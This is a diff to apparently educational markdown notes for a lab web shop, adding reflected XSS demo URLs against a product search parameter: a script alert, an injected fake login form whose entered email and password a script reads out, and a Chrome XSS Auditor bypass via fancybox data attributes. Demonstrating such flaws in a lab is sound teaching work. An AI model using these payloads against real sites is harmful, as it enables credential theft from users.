@@ -77,6 +77,22 @@ AwesomeShop
 `http://awesome.lab/oc/index.php?route=common/home#default=%3Cscript%3Ealert%281%29%3C/script%3E`
 
 
+## XSS demo in my Firefox (password steal)
+
+```
+http://awesome.lab/oc/index.php?route=product/search&search=<h1>Hacked</h1>
+http://awesome.lab/oc/index.php?route=product/search&search=<script>alert(1)</script>
+http://awesome.lab/oc/index.php?route=product/search&search=<form id=x method=post><input type=text name=email><input type=password name=password></form><script>setTimeout(function(){alert(x[0].value%2b/ : /.source%2bx[1].value)},100);</script>
+```
+
+## XSS demo in my Chrome (XSS Auditor bypass)
+
+```
+http://awesome.lab/oc/index.php?route=product/search&search=<xxx class=fancybox data-fancybox-start=1 data-fancybox-type=html data-fancybox-href="%26lt;script>alert(2);%26lt;/script>">
+http://awesome.lab/oc/index.php?route=product/search&search=<form id=x method=post><input type=text name=email><input type=password name=password></form><xxx class=fancybox data-fancybox-start=1 data-fancybox-type=html data-fancybox-href="%26lt;script>setTimeout(function(){alert(x[0].value%2b/ : /.source%2bx[1].value)},3000);%26lt;/script>">
+```    
+
+
 ### Prezentacia
 
 ```
@@ -104,3 +120,5 @@ JSFuck
 </script>
 
 ```
+
+
